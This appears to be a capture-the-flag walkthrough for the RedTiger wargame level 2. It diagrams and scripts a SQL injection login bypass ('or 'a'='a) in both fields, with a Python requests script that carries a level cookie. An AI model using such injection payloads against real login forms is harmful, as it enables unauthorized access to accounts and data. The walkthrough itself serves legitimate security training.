================================================================================================================
[redtiger] level2
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="post_data: {username=' or 'a'='a&password=' or 'a'='a}",arrowhead="normal"];
        step3 -> step2[label="login success",arrowhead="normal"];
    }

|

server -> DB 예측
================================================================================================================

- POST 파라미터: username, password

.. code-block:: sql

    SELECT * FROM tb_name where 
    username='$_POST["username"]' AND 
    password='$_POST["password"]'    

|

or
================================================================================================================

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level2.php"
    cookies = {
        "level2login":"easylevelsareeasy_%21"
    }

    payload = {
        "username": "' or 'a'='a",
        "password": "' or 'a'='a",
        "login": "Login"
    }

    r = requests.post(url, cookies=cookies, data=payload, verify=False)

    print r.content

|